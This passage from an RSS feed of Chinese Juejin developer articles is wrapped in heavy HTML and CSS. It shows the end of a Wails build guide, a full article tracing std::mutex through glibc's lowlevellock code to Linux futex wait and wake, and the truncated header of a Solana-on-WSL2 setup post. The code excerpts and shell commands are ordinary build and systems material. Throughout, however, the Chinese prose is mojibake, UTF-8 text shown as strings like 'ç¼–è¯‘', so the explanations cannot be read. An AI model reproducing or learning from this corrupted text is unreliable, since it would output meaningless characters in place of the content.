<pre><code class="hljs language-bash" lang="bash">go install github.com/wailsapp/wails/v2/cmd/wails@latest
</code></pre>
<h3 data-id="heading-2">3ã€ç¼–è¯‘wailsåº”ç”¨</h3>
<p>æŠŠä»£ç <code>git clone</code>ä¸‹æ¥ä¹‹åï¼Œè¿›å…¥ä»£ç ç›®å½•ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤è¿›è¡Œç¼–è¯‘ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">wails build -tags webkit2_41
</code></pre>
<p>ç¼–è¯‘å®Œæˆåï¼ŒæŠŠäº§å‡ºå¤åˆ¶å‡ºæ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cp</span> build/bin/output /mnt/mac/Users/xxx/Downloads/
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä» `std::mutex` åˆ° futexï¼šæˆ‘å¦‚ä½•ç”¨æºç çœŸæ­£ç†è§£äº’æ–¥é”çš„åº•å±‚é€»è¾‘]]></title>    <link>https://juejin.cn/post/7597811700284424211</link>    <guid>https://juejin.cn/post/7597811700284424211</guid>    <pubDate>2026-01-22T04:57:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597811700284424211" data-draft-id="7597811700284407827" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä» `std::mutex` åˆ° futexï¼šæˆ‘å¦‚ä½•ç”¨æºç çœŸæ­£ç†è§£äº’æ–¥é”çš„åº•å±‚é€»è¾‘"/> <meta itemprop="keywords" content="æ“ä½œç³»ç»Ÿ"/> <meta itemprop="datePublished" content="2026-01-22T04:57:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è‚†å¿†_"/> <meta itemprop="url" content="https://juejin.cn/user/3898194938326714"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä» `std::mutex` åˆ° futexï¼šæˆ‘å¦‚ä½•ç”¨æºç çœŸæ­£ç†è§£äº’æ–¥é”çš„åº•å±‚é€»è¾‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3898194938326714/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è‚†å¿†_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-22T04:57:48.000Z" title="Thu Jan 22 2026 04:57:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æˆ‘æƒ³ææ¸…æ¥šçš„æ˜¯äº’æ–¥é”åˆ°åº•é ä»€ä¹ˆä¿è¯äº’æ–¥ï¼Ÿç«äº‰æ—¶å¦‚ä½•ç¡çœ ï¼Ÿä¸ºä»€ä¹ˆä¸ä¼šä¸¢å”¤é†’ï¼Ÿå¤šç­‰å¾…è€…å¦‚ä½•æ¥åŠ›ï¼Ÿ</p>
<p>æˆ‘å‡†å¤‡äº†ä¸‰å¥—æºç ï¼šlibstdc++ / glibc(NPTL) / Linux å†…æ ¸ã€‚å› ä¸ºé“¾è·¯è·¨ä¸‰å±‚ï¼šC++ æ ‡å‡†åº“åªæ˜¯å…¥å£ï¼ŒçœŸæ­£çš„ç”¨æˆ·æ€åè®®åœ¨ glibcï¼Œé˜»å¡/å”¤é†’é˜Ÿåˆ—æœºåˆ¶åœ¨å†…æ ¸ futexã€‚</p>
<h2 data-id="heading-0">1ï¼‰C++ å±‚ï¼š<code>std::mutex</code> åªæ˜¯è–„å°è£…ï¼ŒæŠŠæ´»äº¤ç»™ gthread/pthread</h2>
<p>æˆ‘å…ˆä» C++ çš„ <code>std::mutex::lock()</code> çœ‹èµ·ã€‚å®ƒæ²¡æœ‰â€œé”ç®—æ³•â€ï¼Œå°±æ˜¯ç›´æ¥è½¬è°ƒï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// libstdc++: bits/std_mutex.hï¼ˆèŠ‚é€‰ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">mutex</span> : <span class="hljs-keyword">private</span> __mutex_base
{
<span class="hljs-keyword">public</span>:
  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">lock</span><span class="hljs-params">()</span>
  </span>{
    <span class="hljs-type">int</span> __e = __gthread_mutex_lock(&amp;_M_mutex);
    <span class="hljs-keyword">if</span> (__e)
      __throw_system_error(__e);
  }

  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unlock</span><span class="hljs-params">()</span>
  </span>{
    __gthread_mutex_unlock(&amp;_M_mutex);
  }
};
</code></pre>
<p>æ‰€ä»¥ç¬¬ä¸€å±‚ç»“è®ºï¼š</p>
<blockquote>
<p><code>std::mutex</code> æœ¬è´¨æŠŠè°ƒç”¨äº¤ç»™ <code>__gthread_mutex_lock</code>ï¼Œä¹Ÿå°±æ˜¯å¹³å°çº¿ç¨‹åº“ï¼ˆPOSIX ä¸‹æ˜¯ pthreadï¼‰ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">2ï¼‰glibc å…³é”®ï¼šç”¨æˆ·æ€â€œçŠ¶æ€å­— + åŸå­æ“ä½œåè®®â€æ‰æ˜¯äº’æ–¥é”æœ¬ä½“</h2>
<p>çœŸæ­£è®©æˆ‘ç†è§£äº’æ–¥é”çš„ï¼Œæ˜¯ glibc çš„ low-level lockï¼ˆlll_lockï¼‰æ³¨é‡Šå’Œå®ç°ã€‚</p>
<h3 data-id="heading-2">2.1 ä¸‰æ€æ¨¡å‹ï¼š0/1/&gt;1ï¼ˆ2ï¼‰</h3>
<p>glibc æŠŠé”å‹ç¼©æˆä¸€ä¸ª int çŠ¶æ€å­—ï¼ˆfutex wordï¼‰ï¼Œå¹¶å®šä¹‰äº†ä¸‰æ€è¯­ä¹‰ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">/* glibc: sysdeps/nptl/lowlevellock.hï¼ˆèŠ‚é€‰ï¼‰
   A lock can be in one of three states:
   0:  not acquired,
   1:  acquired with no waiters;
   &gt;1: acquired, possibly with waiters;
*/</span>
</code></pre>
<p>æˆ‘å¯¹è¿™ä¸‰æ€çš„ç†è§£ï¼š</p>
<ul>
<li>0ï¼šç©ºé—²</li>
<li>1ï¼šå ç”¨ä½†è®¤ä¸ºâ€œæ²¡äººç­‰â€ï¼ˆæ— ç«äº‰å¿«è·¯å¾„ï¼‰</li>
<li>2(&gt;1)ï¼šå ç”¨ä¸”â€œå¯èƒ½æœ‰äººç­‰â€ï¼ˆç«äº‰æ¨¡å¼æ ‡è®°ï¼‰</li>
</ul>
<p>æ³¨æ„ï¼š2 ä¸æ˜¯è®¡æ•°å™¨ï¼Œå®ƒè¡¨è¾¾çš„æ˜¯â€œå¯èƒ½å­˜åœ¨ç­‰å¾…è€…/éœ€è¦ä¿å®ˆå”¤é†’â€ã€‚</p>
<hr/>
<h3 data-id="heading-3">2.2 å¿«è·¯å¾„ï¼šCAS(0â†’1) æˆåŠŸç›´æ¥æ‹¿é”ï¼Œä¸è¿›å†…æ ¸</h3>
<p>å¿«è·¯å¾„å°±åœ¨ lowlevellock çš„å®é‡Œï¼Œæ ¸å¿ƒæ˜¯ä¸€æ¬¡ CASï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// glibc: sysdeps/nptl/lowlevellock.hï¼ˆèŠ‚é€‰ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> __lll_lock(futex, private)                                      \
  ((void)                                                               \
   ({                                                                   \
     int *__futex = (futex);                                            \
     <span class="hljs-keyword">if</span> (__glibc_unlikely                                               \
         (atomic_compare_and_exchange_bool_acq (__futex, 1, 0)))        \
       {                                                                \
         <span class="hljs-comment">/* CAS å¤±è´¥æ‰ä¼šèµ°æ…¢è·¯å¾„ */</span>                                      \
         <span class="hljs-keyword">if</span> (__builtin_constant_p (private) &amp;&amp; (private) == LLL_PRIVATE)\
           __lll_lock_wait_private (__futex);                           \
         <span class="hljs-keyword">else</span>                                                           \
           __lll_lock_wait (__futex, private);                          \
       }                                                                \
   }))</span>
</code></pre>
<p>è¿™é‡Œæˆ‘åªç›¯ä½ä¸€ä¸ªäº‹å®ï¼š</p>
<ul>
<li>CAS 0â†’1 æˆåŠŸï¼šç›´æ¥è¿”å›ï¼ˆçº¯ç”¨æˆ·æ€ï¼Œä¸ syscallï¼‰</li>
<li>CAS å¤±è´¥ï¼šè¯´æ˜é”è¢«å ï¼Œè¿›å…¥æ…¢è·¯å¾„ï¼ˆå¯èƒ½ä¼š futex_waitï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-4">2.3 æ…¢è·¯å¾„ï¼šæŠŠçŠ¶æ€æ¨åˆ° 2ï¼Œç„¶å futex_wait(expected=2) ç¡çœ </h3>
<p>æ…¢è·¯å¾„çœŸæ­£çš„â€œç­‰å¾…å¾ªç¯â€åœ¨ <code>lowlevellock.c</code>ï¼Œæˆ‘è®¤ä¸ºè¿™æ˜¯ç†è§£â€œè¢«å”¤é†’ååˆ°åº•å¹²å•¥â€çš„å…³é”®ï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// glibc: nptl/lowlevellock.cï¼ˆèŠ‚é€‰ï¼‰</span>
<span class="hljs-type">void</span> __lll_lock_wait (<span class="hljs-type">int</span> *futex, <span class="hljs-type">int</span> private)
{
  <span class="hljs-keyword">if</span> (atomic_load_relaxed (futex) == <span class="hljs-number">2</span>)
    <span class="hljs-keyword">goto</span> futex;

  <span class="hljs-keyword">while</span> (atomic_exchange_acquire (futex, <span class="hljs-number">2</span>) != <span class="hljs-number">0</span>)
    {
    futex:
      futex_wait ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *) futex, <span class="hljs-number">2</span>, private); <span class="hljs-comment">/* Wait if *futex == 2. */</span>
    }
}
</code></pre>
<p>è¿™æ®µæˆ‘å½“æ—¶å¡äº†å¾ˆä¹…ï¼Œæœ€åæˆ‘ç”¨æ¨æ¼”æŠŠå®ƒæƒ³é€šï¼š</p>
<ul>
<li><code>atomic_exchange_acquire(futex, 2)</code> çš„æ„æ€æ˜¯ï¼šæˆ‘æ¯æ¬¡éƒ½è¯•å›¾æŠŠé”çŠ¶æ€å†™æˆ 2ã€‚</li>
<li><strong>åªæœ‰å½“ exchange è¯»åˆ°æ—§å€¼æ˜¯ 0</strong>ï¼ˆä¹Ÿå°±æ˜¯æŠŠ 0 æ¢æˆäº† 2ï¼‰ï¼Œæ‰ç®—æŠ¢åˆ°é”å¹¶é€€å‡ºå¾ªç¯ã€‚</li>
<li>å¦‚æœæ—§å€¼ä¸æ˜¯ 0ï¼ˆ1 æˆ– 2ï¼‰ï¼Œè¯´æ˜åˆ«äººæŒæœ‰é”ï¼Œæˆ‘å°±å» <code>futex_wait(expected=2)</code> ç¡çœ ã€‚</li>
</ul>
<blockquote>
<p>è¢«å”¤é†’ä¸ç­‰äºæ‹¿é”ã€‚å”¤é†’åªæ˜¯è®©çº¿ç¨‹ä» futex_wait è¿”å›ï¼Œç„¶åç»§ç»­è·‘ whileï¼Œå†é  exchange å»çœŸæ­£æŠ¢é”ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">3ï¼‰è§£é”ï¼šå…ˆç½® 0ï¼Œå†æ ¹æ®æ—§å€¼æ˜¯å¦ &gt;1 å†³å®šå”¤é†’</h2>
<p>æˆ‘é—®è¿‡â€œé‡Šæ”¾é”æ˜¯ä¸æ˜¯å…ˆæŠŠçŠ¶æ€æ”¹æˆ 0ï¼Œå†å”¤é†’ï¼Ÿâ€â€”â€”ç­”æ¡ˆæ˜¯å¯¹çš„ï¼Œä¸”é¡ºåºå¾ˆé‡è¦ã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// glibc: sysdeps/nptl/lowlevellock.hï¼ˆèŠ‚é€‰ï¼‰</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> __lll_unlock(futex, private)					\
  ((void)								\
  ({									\
     int *__futex = (futex);						\
     int __private = (private);						\
     int __oldval = atomic_exchange_release (__futex, 0);		\
     <span class="hljs-keyword">if</span> (__glibc_unlikely (__oldval &gt; 1))				\
       {								\
         <span class="hljs-keyword">if</span> (__builtin_constant_p (private) &amp;&amp; (private) == LLL_PRIVATE) \
           __lll_lock_wake_private (__futex);                           \
         <span class="hljs-keyword">else</span>                                                           \
           __lll_lock_wake (__futex, __private);			\
       }								\
   }))</span>
</code></pre>
<p>è¿™é‡Œæˆ‘åªè®°ä½é€»è¾‘ï¼š</p>
<ul>
<li><code>exchange(...,0)</code>ï¼šçœŸæ­£é‡Šæ”¾é”</li>
<li><code>oldval &gt; 1</code> æ‰ wakeï¼šè¯´æ˜è¿›å…¥è¿‡ç«äº‰æ¨¡å¼ï¼Œå¯èƒ½æœ‰äººç¡ç€ï¼Œéœ€è¦å”¤é†’ä¸€ä¸ª</li>
<li>oldval == 1ï¼šçº¯æ— ç«äº‰ï¼Œè§£é”ä¸è¿›å†…æ ¸</li>
</ul>
<p>å”¤é†’å‡½æ•°æœ€ç»ˆä¹Ÿæ˜¯ futex_wakeï¼š</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// glibc: nptl/lowlevellock.cï¼ˆèŠ‚é€‰ï¼‰</span>
<span class="hljs-type">void</span> __lll_lock_wake (<span class="hljs-type">int</span> *futex, <span class="hljs-type">int</span> private)
{
  lll_futex_wake (futex, <span class="hljs-number">1</span>, private);
}
</code></pre>
<hr/>
<h2 data-id="heading-6">4ï¼‰æˆ‘æœ€å…³é”®çš„ç–‘é—®ï¼šé˜Ÿåˆ—é‡Œä¸æ­¢ä¸€ä¸ªçº¿ç¨‹æ€ä¹ˆåŠï¼Ÿè°æ¥ä¿è¯çŠ¶æ€ä¸€ç›´æ˜¯ 2ï¼Ÿ</h2>
<p>æˆ‘å½“æ—¶çš„ç–‘é—®æ˜¯ï¼š</p>
<blockquote>
<p>å¦‚æœç­‰å¾…é˜Ÿåˆ—é‡Œä¸æ­¢ä¸€ä¸ªçº¿ç¨‹ï¼Œè¢«å”¤é†’çš„çº¿ç¨‹æŠ¢åˆ°é”ååº”è¯¥æŠŠçŠ¶æ€è®¾ä¸ºå¤šå°‘ï¼Ÿ<br/>
å®ƒæ€ä¹ˆçŸ¥é“é˜Ÿåˆ—é‡Œè¿˜æœ‰æ²¡æœ‰çº¿ç¨‹åœ¨ç¡ï¼Ÿ</p>
</blockquote>
<p>æˆ‘æœ€åæƒ³é€šçš„ç‚¹æ˜¯ï¼š</p>
<ul>
<li><strong>è¢«å”¤é†’è¿™ä¸€åˆ»ä¸ä¼šä¿®æ”¹çŠ¶æ€å­—</strong>ï¼ˆwake ä¸æ”¹ç”¨æˆ·æ€çŠ¶æ€ï¼‰</li>
<li>çœŸæ­£æ”¹çŠ¶æ€å‘ç”Ÿåœ¨å®ƒé†’æ¥åæ‰§è¡Œ while æ¡ä»¶ï¼š<code>atomic_exchange_acquire(futex, 2)</code></li>
<li>å®ƒæŠ¢åˆ°é”æ—¶ä¼šæŠŠ 0 æ”¹æˆ 2ï¼Œå¹¶ä¿æŒ 2ï¼ˆç«äº‰æ¨¡å¼ï¼‰ï¼Œè¿™è®©åç»­é‡Šæ”¾è€…ç»§ç»­ <code>oldval&gt;1 â†’ wake(1)</code>ï¼Œå½¢æˆæ¥åŠ›</li>
</ul>
<p>æ‰€ä»¥ç­”æ¡ˆæ˜¯ï¼š</p>
<blockquote>
<p>çº¿ç¨‹ä¸éœ€è¦çŸ¥é“é˜Ÿåˆ—è¿˜æœ‰å‡ ä¸ªäººï¼›åªè¦é”ä¿æŒåœ¨ 2ï¼ˆå¯èƒ½æœ‰ç­‰å¾…è€…ï¼‰ï¼Œé‡Šæ”¾è€…å°±ä¼šä¿å®ˆåœ° wake(1)ï¼Œå‰©ä½™ç­‰å¾…è€…å°±ä¸ä¼šæ°¸è¿œç¡æ­»ã€‚å°±ç®—å·²ç»æ²¡äººç­‰äº†ï¼Œå¤š wake ä¸€æ¬¡ä¹Ÿä¸ä¼šå‡ºé”™ï¼ˆæœ€å¤šå”¤é†’ 0 ä¸ªï¼‰ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">5ï¼‰æˆ‘è‡ªå·±çš„æœ€ç»ˆæ€»ç»“</h2>
<p>æˆ‘ç°åœ¨å¯¹ mutex çš„ç†è§£æ˜¯ä¸€æ¡å®Œæ•´é“¾è·¯ï¼š</p>
<ol>
<li>C++ çš„ <code>std::mutex::lock()</code> å¹¶ä¸å®ç°é”ç®—æ³•ï¼Œåªæ˜¯è½¬è°ƒåˆ° <code>__gthread_mutex_lock</code>ï¼ŒPOSIX ä¸‹æœ€ç»ˆæ˜¯ pthreadã€‚</li>
<li>glibc ç”¨ä¸€ä¸ª int çŠ¶æ€å­—ï¼ˆfutex wordï¼‰å®ç° mutex çš„ç”¨æˆ·æ€åè®®ï¼š0 ç©ºé—²ã€1 æ— ç«äº‰å ç”¨ã€2(&gt;1) ç«äº‰æ¨¡å¼å ç”¨ã€‚</li>
<li>å¿«è·¯å¾„ï¼šCAS(0â†’1) æˆåŠŸç›´æ¥æ‹¿é”ï¼Œä¸è¿›å†…æ ¸ï¼›è§£é” 1â†’0 ä¹Ÿä¸ wakeã€‚</li>
<li>æ…¢è·¯å¾„ï¼šæŠ¢ä¸åˆ°é”å°±æŠŠçŠ¶æ€æ¨åˆ° 2ï¼Œç„¶å <code>futex_wait(expected=2)</code> ç¡çœ ï¼›é†’æ¥åç»§ç»­å¾ªç¯ï¼Œç”¨ <code>exchange(0â†’2)</code> çœŸæ­£æŠ¢é”ã€‚</li>
<li>è§£é”æ—¶å…ˆ <code>exchange(...,0)</code> é‡Šæ”¾é”ï¼Œå†æ ¹æ®æ—§å€¼æ˜¯å¦ &gt;1 æ¥ <code>futex_wake(1)</code> å”¤é†’ä¸€ä¸ªç­‰å¾…è€…ï¼Œå½¢æˆæ¥åŠ›ã€‚</li>
<li>å¿«è·¯å¾„/æ…¢è·¯å¾„çš„æœ¬è´¨å·®åˆ«ï¼šæ˜¯å¦éœ€è¦èµ° futex è¿›å…¥å†…æ ¸è¿›è¡Œé˜»å¡/å”¤é†’ï¼›æ ¸å¿ƒæ­£ç¡®æ€§æ¥è‡ªâ€œç”¨æˆ·æ€çŠ¶æ€æœº + futex çš„ expected ç­‰å¾…è¯­ä¹‰â€ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Winç³»ç»ŸWSL2å®‰è£…Solanaå¼€å‘ç¯å¢ƒ]]></title>    <link>https://juejin.cn/post/7597466318977794082</link>    <guid>https://juejin.cn/post/7597466318977794082</guid>    <pubDate>2026-01-21T09:14:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597466318977794082" data-draft-id="7597466318977777698" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Winç³»ç»ŸWSL2å®‰è£…Solanaå¼€å‘ç¯å¢ƒ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-21T09:14:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="liu4509"/> <meta itemprop="url" content="https://juejin.cn/user/690962369882168"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Winç³»ç»ŸWSL2å®‰è£…Solanaå¼€å‘ç¯å¢ƒ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/690962369882168/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    liu4509
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T09:14:20.000Z" title="Wed Jan 21 2026 09:14:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    47
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body 